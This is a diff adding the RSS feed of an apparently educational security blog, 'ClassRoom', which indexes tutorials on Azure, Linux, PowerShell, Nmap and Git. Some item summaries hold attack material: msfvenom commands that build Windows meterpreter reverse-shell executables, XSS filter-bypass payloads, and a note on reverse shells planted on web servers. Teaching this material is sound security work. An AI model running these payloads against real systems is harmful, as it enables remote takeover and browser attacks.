@@ -1,0 +1,240 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Blogs on ClassRoom</title>
+    <link>https://anir0y.github.io/class/blog/</link>
+    <description>Recent content in Blogs on ClassRoom</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>anir0y</copyright>
+    <lastBuildDate>Mon, 12 Aug 2019 14:21:54 +0530</lastBuildDate>
+    
+	<atom:link href="https://anir0y.github.io/class/blog/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Azure DeployWebAPP III</title>
+      <link>https://anir0y.github.io/class/blog/azure-deploywebapp-iii/</link>
+      <pubDate>Mon, 12 Aug 2019 14:21:54 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/azure-deploywebapp-iii/</guid>
+      <description>sometimes Practicals makes more sense, you can try the same with following lab setup. this don&amp;rsquo;t require any card information. all you need a Microsoft account.</description>
+    </item>
+    
+    <item>
+      <title>Azure DeployWebAPP II</title>
+      <link>https://anir0y.github.io/class/blog/azure-deploywebapp-ii/</link>
+      <pubDate>Mon, 12 Aug 2019 14:21:51 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/azure-deploywebapp-ii/</guid>
+      <description>Introduction Imagine you&amp;rsquo;re building a website for a new business, or you&amp;rsquo;re running an existing web app on an aging on-premises server. Setting up a new server can be challenging.</description>
+    </item>
+    
+    <item>
+      <title>Azure DeployWebAPP I</title>
+      <link>https://anir0y.github.io/class/blog/azure-deploywebapp-i/</link>
+      <pubDate>Mon, 12 Aug 2019 14:21:45 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/azure-deploywebapp-i/</guid>
+      <description>Why use the Azure portal? The first step in hosting your web application is to create a web app (an App Service app) inside your Azure subscription.</description>
+    </item>
+    
+    <item>
+      <title>Theat Model</title>
+      <link>https://anir0y.github.io/class/blog/theat-model/</link>
+      <pubDate>Mon, 29 Jul 2019 16:00:19 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/theat-model/</guid>
+      <description>Introduction Objective of the Threat Modelling Control Cheat Sheet – To provide guidance to architects, designers and reviewers, on deriving threat models for applications.</description>
+    </item>
+    
+    <item>
+      <title>Class|OSINT</title>
+      <link>https://anir0y.github.io/class/blog/class-osint/</link>
+      <pubDate>Tue, 09 Jul 2019 19:32:52 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/class-osint/</guid>
+      <description>Awesome OSINT  
+A curated list of amazingly awesome open source intelligence tools and resources. Open-source intelligence (OSINT) is intelligence collected from publicly available sources.</description>
+    </item>
+    
+    <item>
+      <title>Get SSH Login Notification on Telegram</title>
+      <link>https://anir0y.github.io/class/blog/bash-get-ssh-login-notification-on-telegram/</link>
+      <pubDate>Mon, 08 Jul 2019 17:46:54 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/bash-get-ssh-login-notification-on-telegram/</guid>
+      <description>Description A simple shell script that executes automatically once a ssh user logs into a server with SSH. The script sends a telegram message to a user of your choice.</description>
+    </item>
+    
+    <item>
+      <title>Linux| Linux firewalls</title>
+      <link>https://anir0y.github.io/class/blog/linux-4/</link>
+      <pubDate>Sat, 06 Jul 2019 21:13:49 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/linux-4/</guid>
+      <description>The Firewall A firewall is a set of rules. When a data packet moves into or out of a protected network space, its contents (in particular, information about its origin, target, and the protocol it plans to use) are tested against the firewall rules to see if it should be allowed through.</description>
+    </item>
+    
+    <item>
+      <title>Linux | Basic Commands</title>
+      <link>https://anir0y.github.io/class/blog/linux-3/</link>
+      <pubDate>Thu, 04 Jul 2019 22:04:17 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/linux-3/</guid>
+      <description>Usage Note: Hold option (alt) and click a position in the current line to move your cursor to that position.
+Clear history: ctrl + l</description>
+    </item>
+    
+    <item>
+      <title>Linux | File Permissions</title>
+      <link>https://anir0y.github.io/class/blog/linux-2/</link>
+      <pubDate>Thu, 04 Jul 2019 19:01:36 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/linux-2/</guid>
+      <description>File Permissions - chmod Linux has inherited from UNIX the concept of ownerships and permissions for files. This is basically because it was conceived as a networked system where different people would be using a variety of programs, files, etc.</description>
+    </item>
+    
+    <item>
+      <title>Linux Intro</title>
+      <link>https://anir0y.github.io/class/blog/linux-1/</link>
+      <pubDate>Thu, 04 Jul 2019 18:28:43 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/linux-1/</guid>
+      <description>What is Linux? Linux is a family of open source Unix-like operating systems based on the Linux kernel, an operating system kernel first released on September 17, 1991 by Linus Torvalds.</description>
+    </item>
+    
+    <item>
+      <title>Powershell - Information Collection</title>
+      <link>https://anir0y.github.io/class/blog/powershell-commands-2/</link>
+      <pubDate>Tue, 02 Jul 2019 15:42:48 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/powershell-commands-2/</guid>
+      <description>Collecting Information About Computers Cmdlets from CimCmdlets module are the most important cmdlets for general system management tasks. All critical subsystem settings are exposed through WMI.</description>
+    </item>
+    
+    <item>
+      <title>Powershell - CHange State</title>
+      <link>https://anir0y.github.io/class/blog/powershell-commands-1/</link>
+      <pubDate>Tue, 02 Jul 2019 15:42:44 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/powershell-commands-1/</guid>
+      <description>Basic commands to change computer state (shutdown, restart, lock) To reset a computer in Windows PowerShell, use either a standard command-line tool or a WMI class.</description>
+    </item>
+    
+    <item>
+      <title>Powershell - Intro</title>
+      <link>https://anir0y.github.io/class/blog/powershell-intro/</link>
+      <pubDate>Tue, 02 Jul 2019 15:42:06 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/powershell-intro/</guid>
+      <description>PowerShell  PowerShell is a task-based command-line shell and scripting language built on .NET. PowerShell helps system administrators and power-users rapidly automate tasks that manage operating systems (Linux, macOS, and Windows) and processes.</description>
+    </item>
+    
+    <item>
+      <title>Cheatsheet Msfpaylods</title>
+      <link>https://anir0y.github.io/class/blog/cheatsheet-msfpaylods/</link>
+      <pubDate>Mon, 01 Jul 2019 18:33:42 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/cheatsheet-msfpaylods/</guid>
+      <description>Most Common Payloads Binaries    Command Info     msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe &amp;gt; example.exe Creates a simple TCP Payload for Windows   msfvenom -p windows/meterpreter/reverse_http LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe &amp;gt; example.</description>
+    </item>
+    
+    <item>
+      <title>Cheatsheet Vim</title>
+      <link>https://anir0y.github.io/class/blog/cheatsheet-vim/</link>
+      <pubDate>Mon, 01 Jul 2019 18:28:27 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/cheatsheet-vim/</guid>
+      <description>Vim is a CLI text editor. and here we have some usefull commands.
+ Modes and Basic movement vim - shows info about vim default mode is command mode j/k/h/l - navigation i - insert mode esc - go back to command mode  Faster Movement w - jump from word to word W - move whole word b - go back to word B - back to whole word A - append at the end of line $ - go to end of line ^ - go to first non space char of line 0 - go to very beginning of line gg - begining of file G - go to end of file } - jump to next paragraph { - back to paragraph f* - will find the first occurance of * in the line F* - find backwords the * char t* - till the occurence of * T* - backward occurence of * 8gg - 8th line 8G - 8th line :8 - go to 8th line ; - repeat the last search , - repeat last search on opposite direction  Basic Editing :e ~/.</description>
+    </item>
+    
+    <item>
+      <title>Tmux Cheatsheet</title>
+      <link>https://anir0y.github.io/class/blog/tmux-cheatsheet/</link>
+      <pubDate>Mon, 01 Jul 2019 18:20:27 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/tmux-cheatsheet/</guid>
+      <description>start new:
+tmux  start new with session name:
+tmux new -s myname  attach:
+tmux a # (or at, or attach)  attach to named:</description>
+    </item>
+    
+    <item>
+      <title>Nmap Cheatsheet</title>
+      <link>https://anir0y.github.io/class/blog/nmap-cheatsheet/</link>
+      <pubDate>Mon, 01 Jul 2019 18:09:53 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/nmap-cheatsheet/</guid>
+      <description>Target Specification    Switch Example Description      nmap 192.168.1.1 Scan a single IP    nmap 192.168.1.1 192.</description>
+    </item>
+    
+    <item>
+      <title>Nmap Os Fingerprinting</title>
+      <link>https://anir0y.github.io/class/blog/nmap-os-fingerprinting/</link>
+      <pubDate>Mon, 01 Jul 2019 17:56:35 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/nmap-os-fingerprinting/</guid>
+      <description>Lesson 2  What is OS fingerprinting? OS fingerprinting is the process of differentiating the OS used by a host in a network. There can be different implementations in determining this like obtaining the TCP/IP stack (TTL value defaults), HTTP packets (via User-Agent field), via ICMP requests, open port patterns, TCP window size and more.</description>
+    </item>
+    
+    <item>
+      <title>Nmap Smtp</title>
+      <link>https://anir0y.github.io/class/blog/nmap-smtp/</link>
+      <pubDate>Mon, 01 Jul 2019 17:56:24 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/nmap-smtp/</guid>
+      <description>Lesson 3  What is SMTP SMTP stands for Simple Mail Transfer Protocol and is used for email delivery from an email client to an email server.</description>
+    </item>
+    
+    <item>
+      <title>Nmap Intro</title>
+      <link>https://anir0y.github.io/class/blog/nmap-intro/</link>
+      <pubDate>Mon, 01 Jul 2019 17:56:16 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/nmap-intro/</guid>
+      <description>Lesson 1  Introduction Nmap (&amp;ldquo;Network Mapper&amp;rdquo;) is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime.</description>
+    </item>
+    
+    <item>
+      <title>Spawn Shell</title>
+      <link>https://anir0y.github.io/class/blog/spawn-shell/</link>
+      <pubDate>Mon, 01 Jul 2019 17:19:45 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/spawn-shell/</guid>
+      <description>Non-interactive tty-shell If you have a non-tty-shell there are certain commands and stuff you can&amp;rsquo;t do. This can happen if you upload reverse shells on a web server, so that the shell you get is by the user www-data, or similar.</description>
+    </item>
+    
+    <item>
+      <title>Security Audit of AWS.</title>
+      <link>https://anir0y.github.io/class/blog/securityaudit-aws/</link>
+      <pubDate>Mon, 01 Jul 2019 17:16:39 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/securityaudit-aws/</guid>
+      <description>We want your security testing to be a positive experience that efficiently gathers the objective evidence you need, without errors or interruptions. The following are some helpful tips that when followed will likely improve that experience, while also being appreciated by your provider, AWS, and other AWS customers.</description>
+    </item>
+    
+    <item>
+      <title>Xss Bypassfilter</title>
+      <link>https://anir0y.github.io/class/blog/xss-bypassfilter/</link>
+      <pubDate>Mon, 01 Jul 2019 17:12:57 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/xss-bypassfilter/</guid>
+      <description>XSS Chrome XSS-Auditor Bypass by @vivekchsm
+&amp;lt;svg&amp;gt;&amp;lt;animate xlink:href=#x attributeName=href values=&amp;amp;#106;avascript:alert(1) /&amp;gt;&amp;lt;a id=x&amp;gt;&amp;lt;rect width=100 height=100 /&amp;gt;&amp;lt;/a&amp;gt;  Chrome &amp;lt; v60 beta XSS-Auditor Bypass
+&amp;lt;script src=&amp;quot;data:,alert(1)%250A--&amp;gt;  Other Chrome XSS-Auditor Bypasses</description>
+    </item>
+    
+    <item>
+      <title>Git Cheatsheet</title>
+      <link>https://anir0y.github.io/class/blog/git-cheatsheet/</link>
+      <pubDate>Mon, 01 Jul 2019 17:05:32 +0530</pubDate>
+      
+      <guid>https://anir0y.github.io/class/blog/git-cheatsheet/</guid>
+      <description>Global Settings  Related Setup: https://gist.github.com/hofmannsven/6814278 Related Pro Tips: https://ochronus.com/git-tips-from-the-trenches/ Interactive Beginners Tutorial: http://try.github.io/ Git Cheatsheet by GitHub: https://services.github.com/on-demand/downloads/github-git-cheat-sheet/  Reminder Press minus + shift + s and return to chop/fold long lines!</description>
+    </item>
+    
+  </channel>
+</rss>
